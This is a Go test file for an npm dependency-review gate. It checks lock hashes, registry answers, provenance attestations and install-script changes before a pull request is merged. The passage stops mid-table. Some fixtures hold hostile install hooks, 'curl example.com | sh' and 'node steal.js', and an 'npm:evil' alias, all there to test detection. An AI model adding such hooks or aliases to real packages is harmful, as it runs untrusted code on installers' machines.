package npm

import (
	"context"
	"encoding/base64"
	"encoding/hex"
	json "encoding/json/v2"
	"errors"
	"fmt"
	"net/http"
	"reflect"
	"strings"
	"testing"
	"time"

	"github.com/sadbox/dep-review/internal/advisory"
	"github.com/sadbox/dep-review/internal/allow"
	"github.com/sadbox/dep-review/internal/artifact"
	"github.com/sadbox/dep-review/internal/facts"
)

// testNow is after every fixture version had its 72 hours.
var testNow = time.Date(2026, 11, 22, 12, 0, 0, 0, time.UTC)

// testPolicy is the embedded defaults (docs/v0.2-spec.md, section 5).
func testPolicy() allow.Policy {
	return allow.Policy{
		MinAge:       72 * time.Hour,
		UnreadAge:    14 * 24 * time.Hour,
		MajorAge:     14 * 24 * time.Hour,
		NewNameAge:   365 * 24 * time.Hour,
		WaitDeadline: 7 * 24 * time.Hour,
		FastPath:     true,
		Companions:   allow.RideAlong,
		Listed:       map[string][]string{allow.NPM: {"tailwindcss", "@tailwindcss/"}},
	}
}

// fakeAdvisories answers "nothing known" for every update, unless told
// otherwise for a name.
type fakeAdvisories struct {
	byName map[string]advisory.Result
	err    error
}

func nothingKnown() advisory.Result {
	const source = "GET /advisories (test)"
	return advisory.Result{
		SecurityFix:   allow.No("no advisory names this version as the fix", source),
		NoMalware:     allow.Yes("no malware advisory", source),
		NoNewAdvisory: allow.Yes("no new advisory", source),
	}
}

func (f fakeAdvisories) Check(_ context.Context, q advisory.Query) (advisory.Result, error) {
	if f.err != nil {
		return advisory.Result{}, f.err
	}
	if q.Ecosystem != allow.NPM {
		return advisory.Result{}, errors.New("asked about " + q.Ecosystem)
	}
	if r, ok := f.byName[q.Name]; ok {
		return r, nil
	}
	return nothingKnown(), nil
}

// gatherCase runs Gather on a recorded case.
func gatherCase(t *testing.T, c testCase, override map[string]string, adv advisory.Checker) facts.Result {
	t.Helper()
	res, err := Gatherer{tool: replay(t, c)}.Gather(context.Background(), facts.Input{
		Repo:       "example/repo",
		Files:      c.files(""),
		Policy:     testPolicy(),
		HTTP:       newFakeRegistry(t, override),
		Advisories: adv,
		Now:        func() time.Time { return testNow },
	})
	if err != nil {
		t.Fatalf("Gather: %v", err)
	}
	return res
}

// decide runs the result through allow.Decide as the caller would after a
// full read with no veto, so a test can say what the facts amount to.
func decide(res facts.Result) allow.Decision {
	pr := allow.PRFacts{
		Ecosystem:        allow.NPM,
		Identity:         allow.Yes("test", "test"),
		Shape:            res.Shape,
		ChecksConfigured: allow.Yes("test", "test"),
	}
	// As the deciding job would have it: a pull request opened an hour
	// ago, with the model's read in.
	pr.Opened = testNow.Add(-time.Hour)
	for _, u := range res.Updates {
		u.Read = allow.ReadFull
		pr.Updates = append(pr.Updates, u)
	}
	return allow.Decide(pr, testPolicy(), testNow)
}

func findUpdate(t *testing.T, res facts.Result, name string) allow.UpdateFacts {
	t.Helper()
	for _, u := range res.Updates {
		if u.Name == name {
			return u
		}
	}
	t.Fatalf("no update for %s in %d updates", name, len(res.Updates))
	return allow.UpdateFacts{}
}

func names(res facts.Result) string {
	var out []string
	for _, u := range res.Updates {
		out = append(out, u.Name+" "+u.From+"->"+u.To)
	}
	return strings.Join(out, ", ")
}

func TestGatherPlain(t *testing.T) {
	for _, name := range []string{"plain", "lockonly", "lockv2", "casekeys"} {
		t.Run(name, func(t *testing.T) {
			res := gatherCase(t, loadCase(t, name), nil, fakeAdvisories{})
			if !res.Shape.Holds() {
				t.Fatalf("Shape: %+v", res.Shape)
			}
			if !strings.Contains(res.Shape.Source, "npm 11.20.0: "+lsCommand) {
				t.Errorf("Shape.Source does not record the npm version and command: %q", res.Shape.Source)
			}
			const want = "chart.js 4.4.6->4.4.7, core-js 3.38.0->3.38.1, tailwindcss 4.3.4->4.3.5"
			if got := names(res); got != want {
				t.Fatalf("updates:\n got %s\nwant %s", got, want)
			}

			chart := findUpdate(t, res, "chart.js")
			for what, f := range map[string]allow.Fact{
				"Known": chart.Known, "Increase": chart.Increase, "Bound": chart.Bound,
				"Clean": chart.Clean, "NoRegress": chart.NoRegress,
			} {
				if !f.Holds() {
					t.Errorf("chart.js %s does not hold: %+v", what, f)
				}
			}
			for what, f := range map[string]allow.Fact{
				"Listed": chart.Listed, "NewName": chart.NewName, "Major": chart.Major, "SecurityFix": chart.SecurityFix,
			} {
				if !f.Gathered() || f.OK {
					t.Errorf("chart.js %s should be a gathered no: %+v", what, f)
				}
			}
			if want := time.Date(2024, 12, 1, 16, 47, 46, 119e6, time.UTC); !chart.FirstSeen.Known() || !chart.FirstSeen.Time.Equal(want) {
				t.Errorf("chart.js FirstSeen = %+v, want %s", chart.FirstSeen, want)
			}
			if want := time.Date(2014, 7, 8, 22, 30, 18, 422e6, time.UTC); !chart.NameCreated.Known() || !chart.NameCreated.Time.Equal(want) {
				t.Errorf("chart.js NameCreated = %+v, want %s", chart.NameCreated, want)
			}
			// The hash Bound was established for is the real one, also
			// when the entry carries a look-alike "Integrity".
			const chartHash = "sha512-pwkcKfdzTMAU/+jNosKhNL2bHtJc/sSmYgVbuGTEDhzkrhmyihmP7vUc/5ZK9WopidMDHNe3Wm7jOd/WhuHWuw=="
			if !strings.Contains(chart.Bound.Value, chartHash) {
				t.Errorf("chart.js Bound.Value = %q, want the lock's integrity", chart.Bound.Value)
			}

			core := findUpdate(t, res, "core-js")
			if !core.NoRegress.Holds() || !strings.Contains(core.NoRegress.Value, "install scripts unchanged (postinstall: ") {
				t.Errorf("core-js NoRegress = %+v", core.NoRegress)
			}

			tw := findUpdate(t, res, "tailwindcss")
			if !tw.Listed.Holds() || !tw.Known.Holds() {
				t.Errorf("tailwindcss Listed = %+v, Known = %+v", tw.Listed, tw.Known)
			}
			if !tw.NoRegress.Holds() || !strings.Contains(tw.NoRegress.Value, `same provenance identity ("https://github.com/tailwindlabs/tailwindcss", workflow ".github/workflows/release.yml"`) {
				t.Errorf("tailwindcss NoRegress = %+v", tw.NoRegress)
			}

			if len(res.Artifacts) != 3 {
				t.Fatalf("%d artifact pairs, want 3", len(res.Artifacts))
			}
			wantPair := artifact.Pair{
				Ecosystem: allow.NPM, Name: "chart.js", From: "4.4.6", To: "4.4.7",
				Old: artifact.Ref{Kind: artifact.NPMTarball, Name: "chart.js", Version: "4.4.6", Hash: "sha512-8Y406zevUPbbIBA/HRk33khEmQPk5+cxeflWE/2rx1NJsjVWMPw/9mSP9rxHP5eqi6LNoPBVMfZHxbwLSgldYA=="},
				New: artifact.Ref{Kind: artifact.NPMTarball, Name: "chart.js", Version: "4.4.7", Hash: chartHash},
			}
			if res.Artifacts[0] != wantPair {
				t.Errorf("artifact pair:\n got %+v\nwant %+v", res.Artifacts[0], wantPair)
			}

			// Every fact is gathered and consistent: with a full read and
			// no veto the pull request merges.
			if d := decide(res); d.Outcome != allow.Merge {
				t.Errorf("Decide = %s %v, want merge", d.Outcome, d.Reasons)
			}
		})
	}
}

// Bundled dependencies are part of their parent's artifact (spec section
// 11, amendment 5): one update, the parent's; one artifact, the parent's
// tarball, which holds them; and a NoRegress that the registry and the
// lock can vouch for as for any other package. What only the tarball can
// show about the bundled packages is InspectTarballs'.
func TestGatherBundled(t *testing.T) {
	const (
		name    = "@tailwindcss/oxide-wasm32-wasi"
		oldHash = "sha512-bjO9WmoM687p8AoCIyw1DUqzpAs4JICLvNmIPxIWDmhw8IOsdubtWQLShyJmISnDKtRy1BBApHVOUl6sNFQQJA=="
		newHash = "sha512-OJhFmlEfdzMr+avACdi40RPtnkW0B6hXyxL/8r+tnEHBWZji36CYRjEXrrvgBmaYsD3oEOBqwYFRKsYvzFe7Bw=="
		repo    = "https://github.com/tailwindlabs/tailwindcss"
		release = ".github/workflows/release.yml"
	)
	// The registry lists provenance for both versions. Their attestations
	// were not recorded, so they are built here for the lock's own hashes.
	override := map[string]string{
		attestationURL(name, "4.3.4"): attestationJSON(t, name, "4.3.4", oldHash, repo, release),
		attestationURL(name, "4.3.5"): attestationJSON(t, name, "4.3.5", newHash, repo, release),
	}
	res := gatherCase(t, loadCase(t, "bundled"), override, fakeAdvisories{})
	if !res.Shape.Holds() {
		t.Fatalf("Shape: %+v", res.Shape)
	}
	if got, want := names(res), "@tailwindcss/oxide-wasm32-wasi 4.3.4->4.3.5"; got != want {
		t.Fatalf("updates: got %s, want %s (bundled entries are not updates of their own)", got, want)
	}
	u := res.Updates[0]
	if !u.NoRegress.Holds() || !strings.Contains(u.NoRegress.Value, "bundles ") || !strings.Contains(u.NoRegress.Value, "@emnapi/core") ||
		!strings.Contains(u.NoRegress.Value, "read and inspected with its tarball") {
		t.Errorf("NoRegress = %+v, want it to hold and to name the bundled packages", u.NoRegress)
	}
	if !u.Bound.Holds() || !u.Listed.Holds() || !u.Known.Holds() {
		t.Errorf("Bound = %+v, Listed = %+v, Known = %+v", u.Bound, u.Listed, u.Known)
	}
	// One artifact: the parent's two tarballs, at the lock's hashes.
	want := artifact.Pair{
		Ecosystem: allow.NPM, Name: name, From: "4.3.4", To: "4.3.5",
		Old: artifact.Ref{Kind: artifact.NPMTarball, Name: name, Version: "4.3.4", Hash: oldHash},
		New: artifact.Ref{Kind: artifact.NPMTarball, Name: name, Version: "4.3.5", Hash: newHash},
	}
	if len(res.Artifacts) != 1 || res.Artifacts[0] != want {
		t.Errorf("artifacts:\n got %+v\nwant %+v", res.Artifacts, want)
	}
	if d := decide(res); d.Outcome != allow.Merge {
		t.Errorf("Decide = %s %v, want merge: tailwind's own packages are listed", d.Outcome, d.Reasons)
	}
}

func TestGatherNewName(t *testing.T) {
	res := gatherCase(t, loadCase(t, "newname"), nil, fakeAdvisories{})
	if !res.Shape.Holds() {
		t.Fatalf("Shape: %+v", res.Shape)
	}
	if got, want := names(res), "@kurkle/color ->0.3.4, chart.js 3.9.1->4.4.7"; got != want {
		t.Fatalf("updates: got %s, want %s", got, want)
	}
	color := findUpdate(t, res, "@kurkle/color")
	if !color.NewName.Holds() || color.Known.OK || !color.Known.Gathered() {
		t.Errorf("@kurkle/color NewName = %+v, Known = %+v", color.NewName, color.Known)
	}
	if !color.Increase.Holds() || color.Major.OK || !color.Major.Gathered() {
		t.Errorf("@kurkle/color Increase = %+v, Major = %+v", color.Increase, color.Major)
	}
	if want := time.Date(2020, 2, 5, 19, 59, 45, 29e6, time.UTC); !color.NameCreated.Known() || !color.NameCreated.Time.Equal(want) {
		t.Errorf("@kurkle/color NameCreated = %+v, want %s", color.NameCreated, want)
	}
	var pair artifact.Pair
	for _, p := range res.Artifacts {
		if p.Name == "@kurkle/color" {
			pair = p
		}
	}
	if pair.To != "0.3.4" || pair.Old != (artifact.Ref{}) || pair.New.Hash == "" {
		t.Errorf("@kurkle/color artifact pair = %+v, want a new tarball and no old one", pair)
	}
	chart := findUpdate(t, res, "chart.js")
	if !chart.Major.Holds() {
		t.Errorf("chart.js Major = %+v", chart.Major)
	}
	// The new name is old enough and everything else holds for it; the
	// pull request goes to a person for the unlisted major alone.
	d := decide(res)
	if d.Outcome != allow.Person || len(d.Reasons) != 1 || d.Reasons[0] != allow.ReasonMajorUnlisted {
		t.Errorf("Decide = %s %v, want person for the unlisted major alone", d.Outcome, d.Reasons)
	}
}

func TestGatherDowngrade(t *testing.T) {
	c := loadCase(t, "plain").swapped()
	res := gatherCase(t, c, nil, fakeAdvisories{})
	if !res.Shape.Holds() {
		t.Fatalf("Shape: %+v", res.Shape)
	}
	chart := findUpdate(t, res, "chart.js")
	if chart.From != "4.4.7" || chart.To != "4.4.6" || chart.Increase.OK || !chart.Increase.Gathered() {
		t.Errorf("chart.js %s->%s Increase = %+v, want a gathered no", chart.From, chart.To, chart.Increase)
	}
	if d := decide(res); d.Outcome != allow.Person {
		t.Errorf("Decide = %s, want person", d.Outcome)
	}
}

func TestGatherShapeNo(t *testing.T) {
	tests := []struct {
		name string
		// edit changes the plain case's files before Gather sees them.
		edit func(files []facts.File) []facts.File
		want string
	}{
		{"lockv1", nil, "lockfileVersion \"1\""},
		{"unreachable", nil, "entries npm ls does not show"},
		{"rehash", nil, "date-fns@4.1.0 at node_modules/date-fns keeps its version"},
		{"flagflip", nil, "date-fns@4.1.0 at node_modules/date-fns keeps its version"},
		{"lockscripts", nil, "node_modules/date-fns carries scripts"},
		{"outofsync", nil, "head: npm ls failed: ELSPROBLEMS"},
		{"special", nil, "extraneous"},
		{"plain", func(f []facts.File) []facts.File {
			return append(f, facts.File{Path: "README.md", BaseMode: "100644", HeadMode: "100644"})
		}, "files other than package.json and package-lock.json: README.md"},
		{"plain", func(f []facts.File) []facts.File {
			return append(f, facts.File{Path: "yarn.lock", BaseMode: "100644", HeadMode: "100644"})
		}, "files other than package.json and package-lock.json: yarn.lock"},
		{"plain", func(f []facts.File) []facts.File {
			return append(f, facts.File{Path: ".npmrc", HeadMode: "100644"})
		}, "files other than package.json and package-lock.json: .npmrc"},
		{"plain", func(f []facts.File) []facts.File {
			other := f[0]
			other.Path = "web/package-lock.json"
			return append(f, other)
		}, "more than one directory"},
		{"plain", func(f []facts.File) []facts.File { return f[1:] }, "package-lock.json did not change"},
		{"plain", func(f []facts.File) []facts.File { f[0].BaseMode = ""; f[0].Base = nil; return f }, "not the same regular file"},
		{"plain", func(f []facts.File) []facts.File { f[0].HeadMode = "120000"; return f }, "not the same regular file"},
		{"plain", func(f []facts.File) []facts.File { f[1].HeadMode = "100755"; return f }, "not the same regular file"},
		{"plain", func(f []facts.File) []facts.File {
			f[1].Head = []byte(strings.Replace(string(f[1].Head), `"private": true,`, `"private": true, "scripts": {"postinstall": "curl example.com | sh"},`, 1))
			return f
		}, "package.json: adds scripts"},
		{"plain", func(f []facts.File) []facts.File {
			f[1].Head = []byte(strings.Replace(string(f[1].Head), `"date-fns": "4.1.0"`, `"date-fns": "^4.1.0"`, 1))
			return f
		}, "package.json: changes the range of date-fns in dependencies, a package the lock does not move"},
		{"plain", func(f []facts.File) []facts.File {
			f[1].Head = []byte(strings.Replace(string(f[1].Head), `"chart.js": "4.4.7"`, `"chart.js": "npm:evil@4.4.7"`, 1))
			return f
		}, "package.json: changes the range of chart.js in dependencies by more than its version"},
		{"plain", func(f []facts.File) []facts.File {
			f[1].Head = []byte(strings.Replace(string(f[1].Head), `"chart.js": "4.4.7"`, `"chart.js": "^4.4.7"`, 1))
			return f
		}, "package.json: changes the range of chart.js in dependencies by more than its version"},
		{"plain", func(f []facts.File) []facts.File {
			f[1].Head = []byte(strings.Replace(string(f[1].Head), `"core-js": "3.38.1",`, `"core-js": "3.38.1", "left-pad": "1.3.0",`, 1))
			return f
		}, "package.json: adds left-pad to dependencies"},
		{"plain", func(f []facts.File) []facts.File {
			f[1].Head = []byte(strings.Replace(string(f[1].Head), `"private": true,`, `"private": true, "private": true,`, 1))
			return f
		}, "head: package.json is not a JSON object the gate can read"},
		{"plain", func(f []facts.File) []facts.File {
			f[0].Head = []byte(strings.Replace(string(f[0].Head), `"lockfileVersion": 3`, `"lockfileVersion": 2`, 1))
			return f
		}, "lockfileVersion changes from 3 to 2"},
	}
	for _, tt := range tests {
		t.Run(tt.name+"/"+tt.want, func(t *testing.T) {
			c := loadCase(t, tt.name)
			files := c.files("")
			if tt.edit != nil {
				files = tt.edit(files)
			}
			res, err := Gatherer{tool: replay(t, c)}.Gather(context.Background(), facts.Input{
				Files: files, Policy: testPolicy(), HTTP: newFakeRegistry(t, nil), Advisories: fakeAdvisories{},
			})
			if err != nil {
				t.Fatalf("Gather: %v", err)
			}
			if res.Shape.OK || !res.Shape.Gathered() {
				t.Fatalf("Shape = %+v, want a gathered no", res.Shape)
			}
			if !strings.Contains(res.Shape.Value, tt.want) {
				t.Errorf("Shape.Value = %q, want it to say %q", res.Shape.Value, tt.want)
			}
			if len(res.Updates) != 0 || len(res.Artifacts) != 0 {
				t.Errorf("a pull request whose shape does not hold reports %d updates and %d artifacts", len(res.Updates), len(res.Artifacts))
			}
			if d := decide(res); d.Outcome != allow.Person {
				t.Errorf("Decide = %s, want person", d.Outcome)
			}
		})
	}
}

func TestGatherNotBound(t *testing.T) {
	for name, want := range map[string]string{
		"offregistry": `resolves to "https://registry.example.com/chart.js/-/chart.js-4.4.7.tgz", not the registry's https://registry.npmjs.org/chart.js/-/chart.js-4.4.7.tgz`,
		"gitsource":   `resolves to "git+ssh://git@github.com/chartjs/Chart.js.git#0123456789abcdef0123456789abcdef01234567"`,
	} {
		t.Run(name, func(t *testing.T) {
			res := gatherCase(t, loadCase(t, name), nil, fakeAdvisories{})
			if !res.Shape.Holds() {
				t.Fatalf("Shape: %+v", res.Shape)
			}
			chart := findUpdate(t, res, "chart.js")
			if chart.Bound.OK || !chart.Bound.Gathered() || !strings.Contains(chart.Bound.Value, want) {
				t.Errorf("Bound = %+v, want a gathered no saying %q", chart.Bound, want)
			}
			for _, p := range res.Artifacts {
				if p.Name == "chart.js" {
					t.Errorf("an update that is not bound has an artifact pair: %+v", p)
				}
			}
			d := decide(res)
			if d.Outcome != allow.Person {
				t.Errorf("Decide = %s, want person", d.Outcome)
			}
		})
	}
}

// packumentJSON builds a registry document for the overrides below.
type fakeVersion struct {
	version, integrity string
	scripts            map[string]string
	deprecated         string
	provenance         bool
	extra              map[string]any
}

func packumentJSON(t *testing.T, name string, versions ...fakeVersion) string {
	t.Helper()
	times := map[string]string{"created": "2015-01-01T00:00:00.000Z", "modified": "2026-11-01T00:00:00.000Z"}
	docs := map[string]any{}
	for _, v := range versions {
		times[v.version] = "2026-11-01T00:00:00.000Z"
		dist := map[string]any{"tarball": tarballURL(name, v.version), "integrity": v.integrity}
		if v.provenance {
			dist["attestations"] = map[string]any{"url": attestationURL(name, v.version), "provenance": map[string]any{"predicateType": slsaPredicate}}
		}
		doc := map[string]any{"name": name, "version": v.version, "dist": dist}
		if v.scripts != nil {
			doc["scripts"] = v.scripts
		}
		if v.deprecated != "" {
			doc["deprecated"] = v.deprecated
		}
		for k, value := range v.extra {
			doc[k] = value
		}
		docs[v.version] = doc
	}
	out, err := json.Marshal(map[string]any{"name": name, "time": times, "versions": docs})
	if err != nil {
		t.Fatal(err)
	}
	return string(out)
}

// attestationJSON builds a provenance answer naming the given builder.
func attestationJSON(t *testing.T, name, version, integrity, repository, workflow string) string {
	t.Helper()
	return envelopeJSON(slsaPredicate, intotoPayload, statementPayload(t, name, version, integrity, repository, workflow))
}

// envelopeJSON builds the registry's attestations answer around signed
// payloads, one attestation per payload.
func envelopeJSON(predicate, payloadType string, payloads ...string) string {
	var parts []string
	for _, p := range payloads {
		parts = append(parts, fmt.Sprintf(`{"predicateType":%q,"bundle":{"dsseEnvelope":{"payload":%q,"payloadType":%q}}}`, predicate, p, payloadType))
	}
	return `{"attestations":[` + strings.Join(parts, ",") + `]}`
}

// statementPayload is a base64 SLSA v1 statement about one tarball.
func statementPayload(t *testing.T, name, version, integrity, repository, workflow string) string {
	t.Helper()
	sum, ok := sha512Of(integrity)
	if !ok {
		t.Fatalf("bad integrity %q", integrity)
	}
	statement := map[string]any{
		"_type":         intotoStatement,
		"subject":       []any{map[string]any{"name": purl(name, version), "digest": map[string]string{"sha512": hex.EncodeToString(sum)}}},
		"predicateType": slsaPredicate,
		"predicate": map[string]any{
			"buildDefinition": map[string]any{
				"buildType":          "https://slsa-framework.github.io/github-actions-buildtypes/workflow/v1",
				"externalParameters": map[string]any{"workflow": map[string]string{"ref": "refs/tags/v" + version, "repository": repository, "path": workflow}},
				"internalParameters": map[string]any{"github": map[string]string{"repository_id": "1", "repository_owner_id": "2"}},
			},
			"runDetails": map[string]any{"builder": map[string]string{"id": "https://github.com/actions/runner/github-hosted"}},
		},
	}
	payload, err := json.Marshal(statement)
	if err != nil {
		t.Fatal(err)
	}
	return base64.StdEncoding.EncodeToString(payload)
}

// The lock's hashes in the plain case.
const (
	chartOld    = "sha512-8Y406zevUPbbIBA/HRk33khEmQPk5+cxeflWE/2rx1NJsjVWMPw/9mSP9rxHP5eqi6LNoPBVMfZHxbwLSgldYA=="
	chartNew    = "sha512-pwkcKfdzTMAU/+jNosKhNL2bHtJc/sSmYgVbuGTEDhzkrhmyihmP7vUc/5ZK9WopidMDHNe3Wm7jOd/WhuHWuw=="
	tailwindOld = "sha512-PCJZTFFdG+sL3gvnP1Do9o6GbkvH2q0p04xSs3f7cSvmAeK+sttG+/7ncK1fdRwKFfC7n+wDDJaOMBSefkI9ow=="
	tailwindNew = "sha512-FcQk9BuffmEHJP2G0XmB2SplU1aLTI7j07Kunk+U74Ny+XiWOtzXz9aujFZ/avntw1e2cOv/3PkgzflQ7gX2vQ=="
	otherHash   = "sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
)

// TestGatherRegistrySays changes one thing the registry says about the
// plain case and checks which fact answers.
func TestGatherRegistrySays(t *testing.T) {
	chartURL := packumentURL("chart.js")
	twURL := packumentURL("tailwindcss")
	const twRepo, twWorkflow = "https://github.com/tailwindlabs/tailwindcss", ".github/workflows/release.yml"
	chart := func(to fakeVersion) map[string]string {
		to.version = "4.4.7"
		if to.integrity == "" {
			to.integrity = chartNew
		}
		return map[string]string{chartURL: packumentJSON(t, "chart.js", fakeVersion{version: "4.4.6", integrity: chartOld}, to)}
	}

	tests := []struct {
		name     string
		override map[string]string
		adv      fakeAdvisories
		update   string
		// fact picks the fact under test.
		fact func(u allow.UpdateFacts) allow.Fact
		// gathered: the fact is a gathered no. Otherwise it has no
		// answer: never gathered, or (reason source_unavailable)
		// unavailable.
		gathered bool
		want     string
		// reason is what allow.Decide says, with the outcome that reason
		// leads to. Empty: the fact holds and the pull request merges.
		reason allow.Reason
	}{
		{
			name:     "registry reports another hash",
			override: chart(fakeVersion{integrity: otherHash}),
			update:   "chart.js", fact: func(u allow.UpdateFacts) allow.Fact { return u.Bound },
			gathered: true, want: "the lock pins " + chartNew + ", the registry reports " + otherHash, reason: allow.ReasonNotBound,
		},
		{
			name:     "version unpublished",
			override: map[string]string{chartURL: packumentJSON(t, "chart.js", fakeVersion{version: "4.4.6", integrity: chartOld})},
			update:   "chart.js", fact: func(u allow.UpdateFacts) allow.Fact { return u.Clean },
			gathered: true, want: "4.4.7 is not on the registry (unpublished)", reason: allow.ReasonNotClean,
		},
		{
			name:     "version unpublished is not bound either",
			override: map[string]string{chartURL: packumentJSON(t, "chart.js", fakeVersion{version: "4.4.6", integrity: chartOld})},
			update:   "chart.js", fact: func(u allow.UpdateFacts) allow.Fact { return u.Bound },
			gathered: true, want: "4.4.7 is not on the registry (unpublished)", reason: allow.ReasonNotBound,
		},
		{
			name:     "package gone",
			override: map[string]string{chartURL: "404"},
			update:   "chart.js", fact: func(u allow.UpdateFacts) allow.Fact { return u.Clean },
			gathered: true, want: "the registry has no package of this name", reason: allow.ReasonNotClean,
		},
		{
			name:     "deprecated",
			override: chart(fakeVersion{deprecated: "do not use"}),
			update:   "chart.js", fact: func(u allow.UpdateFacts) allow.Fact { return u.Clean },
			gathered: true, want: `deprecated on the registry: "\"do not use\""`, reason: allow.ReasonNotClean,
		},
		{
			// A registry that does not answer is a wait, for every fact
			// it is the source of, and never a word against the pin.
			name:     "registry down",
			override: map[string]string{chartURL: "500"},
			update:   "chart.js", fact: func(u allow.UpdateFacts) allow.Fact { return u.Bound },
			want: `the registry did not answer: "HTTP status 500"`, reason: allow.ReasonSourceUnavailable,
		},
		{
			name:     "registry rate limited",
			override: map[string]string{chartURL: "429"},
			update:   "chart.js", fact: func(u allow.UpdateFacts) allow.Fact { return u.Bound },
			want: `the registry did not answer: "HTTP status 429"`, reason: allow.ReasonSourceUnavailable,
		},
		{
			name:     "registry down leaves clean unavailable",
			override: map[string]string{chartURL: "500"},
			update:   "chart.js", fact: func(u allow.UpdateFacts) allow.Fact { return u.Clean },
			want: "the registry did not answer", reason: allow.ReasonSourceUnavailable,
		},
		{
			name:     "registry down leaves no-regress unavailable",
			override: map[string]string{chartURL: "500"},
			update:   "chart.js", fact: func(u allow.UpdateFacts) allow.Fact { return u.NoRegress },
			want: "the registry did not answer", reason: allow.ReasonSourceUnavailable,
		},
		{
			// An answer that arrived and cannot be used is not waited
			// out: asking again gets the same.
			name:     "registry forbids",
			override: map[string]string{chartURL: "403"},
			update:   "chart.js", fact: func(u allow.UpdateFacts) allow.Fact { return u.Bound },
			want: `the registry's answer could not be used: "HTTP status 403"`, reason: allow.ReasonFactMissing,
		},
		{
			name:     "duplicate key in the registry's document",
			override: map[string]string{chartURL: `{"name":"chart.js","name":"chart.js","time":{},"versions":{}}`},
			update:   "chart.js", fact: func(u allow.UpdateFacts) allow.Fact { return u.Bound },
			want: "the registry's document could not be read", reason: allow.ReasonFactMissing,
		},
		{
			name:     "new install script",
			override: chart(fakeVersion{scripts: map[string]string{"postinstall": "node steal.js"}}),
			update:   "chart.js", fact: func(u allow.UpdateFacts) allow.Fact { return u.NoRegress },
			gathered: true, want: `install scripts change from none to postinstall: "node steal.js"`, reason: allow.ReasonRegress,
		},
		{
			name: "changed install script",
			override: map[string]string{packumentURL("core-js"): packumentJSON(t, "core-js",
				fakeVersion{version: "3.38.0", integrity: "sha512-XPpwqEodRljce9KswjZShh95qJ1URisBeKCjUdq27YdenkslVe7OO0ZJhlYXAChW7OhXaRLl8AAba7IBfoIHug==", scripts: map[string]string{"postinstall": "node a.js"}},
				fakeVersion{version: "3.38.1", integrity: "sha512-OP35aUorbU3Zvlx7pjsFdu1rGNnD4pgw/CWoYzRY3t2EzoVT7shKHY1dlAy3f41cGIO7ZDPQimhGFTlEYkG/Hw==", scripts: map[string]string{"postinstall": "node b.js"}})},
			update: "core-js", fact: func(u allow.UpdateFacts) allow.Fact { return u.NoRegress },
			gathered: true, want: `install scripts change from postinstall: "node a.js" to postinstall: "node b.js"`, reason: allow.ReasonRegress,
		},
		{
			name:     "registry marks the new version as building on install",
			override: chart(fakeVersion{extra: map[string]any{"gypfile": true}}),
			update:   "chart.js", fact: func(u allow.UpdateFacts) allow.Fact { return u.NoRegress },
			gathered: true, want: "the registry marks 4.4.7 as building on install, and did not mark 4.4.6", reason: allow.ReasonRegress,
		},
		{
			name:     "install script that is not a string",
			override: chart(fakeVersion{extra: map[string]any{"scripts": map[string]any{"install": []string{"x"}}}}),
			update:   "chart.js", fact: func(u allow.UpdateFacts) allow.Fact { return u.NoRegress },
			gathered: true, want: "the install script is not a string", reason: allow.ReasonRegress,
		},
		{
			name:     "a Scripts key in another case is not the scripts npm runs",
			override: chart(fakeVersion{extra: map[string]any{"Scripts": map[string]string{"postinstall": "x"}}}),
			update:   "chart.js", fact: func(u allow.UpdateFacts) allow.Fact { return u.NoRegress },
			want: "", reason: "",
		},
		{
			// Bundling is not a regression. What the bundled packages do
			// at install is the tarball's to show (InspectTarballs).
			name:     "registry says the new version bundles dependencies",
			override: chart(fakeVersion{extra: map[string]any{"bundleDependencies": []string{"left-pad"}}}),
			update:   "chart.js", fact: func(u allow.UpdateFacts) allow.Fact { return u.NoRegress },
			want: "", reason: "",
		},
		{
			name: "provenance lost",
			override: map[string]string{twURL: packumentJSON(t, "tailwindcss",
				fakeVersion{version: "4.3.4", integrity: tailwindOld, provenance: true},
				fakeVersion{version: "4.3.5", integrity: tailwindNew})},
			update: "tailwindcss", fact: func(u allow.UpdateFacts) allow.Fact { return u.NoRegress },
			gathered: true, want: "4.3.4 was published with provenance, 4.3.5 was not", reason: allow.ReasonRegress,
		},
		{
			name: "provenance from another repository",
			override: map[string]string{attestationURL("tailwindcss", "4.3.5"): attestationJSON(t, "tailwindcss", "4.3.5", tailwindNew,
				"https://github.com/someone-else/tailwindcss", twWorkflow)},
			update: "tailwindcss", fact: func(u allow.UpdateFacts) allow.Fact { return u.NoRegress },
			gathered: true, want: `provenance identity changes: 4.3.4 was built from "https://github.com/tailwindlabs/tailwindcss"`, reason: allow.ReasonRegress,
		},
		{
			name: "provenance from another workflow",
			override: map[string]string{attestationURL("tailwindcss", "4.3.5"): attestationJSON(t, "tailwindcss", "4.3.5", tailwindNew,
				twRepo, ".github/workflows/other.yml")},
			update: "tailwindcss", fact: func(u allow.UpdateFacts) allow.Fact { return u.NoRegress },
			gathered: true, want: "provenance identity changes", reason: allow.ReasonRegress,
		},
		{
			name: "same repository and workflow, other repository id",
			override: map[string]string{
				attestationURL("tailwindcss", "4.3.5"): attestationJSON(t, "tailwindcss", "4.3.5", tailwindNew, twRepo, twWorkflow),
			},
			update: "tailwindcss", fact: func(u allow.UpdateFacts) allow.Fact { return u.NoRegress },
			gathered: true, want: "provenance identity changes", reason: allow.ReasonRegress,
		},
		{
			name: "provenance about another tarball",
			override: map[string]string{attestationURL("tailwindcss", "4.3.5"): attestationJSON(t, "tailwindcss", "4.3.5", otherHash,
				twRepo, twWorkflow)},
			update: "tailwindcss", fact: func(u allow.UpdateFacts) allow.Fact { return u.NoRegress },
			gathered: true, want: "provenance of 4.3.5: the provenance statement is not about the tarball the lock pins", reason: allow.ReasonRegress,
		},
		{
			name:     "attestations missing though the registry lists them",
			override: map[string]string{attestationURL("tailwindcss", "4.3.5"): "404"},
			update:   "tailwindcss", fact: func(u allow.UpdateFacts) allow.Fact { return u.NoRegress },
			gathered: true, want: "provenance of 4.3.5: the registry has no attestations for it", reason: allow.ReasonRegress,
		},
		{
			name:     "attestations not answered",
			override: map[string]string{attestationURL("tailwindcss", "4.3.4"): "500"},
			update:   "tailwindcss", fact: func(u allow.UpdateFacts) allow.Fact { return u.NoRegress },
			want: "provenance of 4.3.4: the registry did not answer", reason: allow.ReasonSourceUnavailable,
		},
		{
			name:     "attestations forbidden",
			override: map[string]string{attestationURL("tailwindcss", "4.3.4"): "403"},
			update:   "tailwindcss", fact: func(u allow.UpdateFacts) allow.Fact { return u.NoRegress },
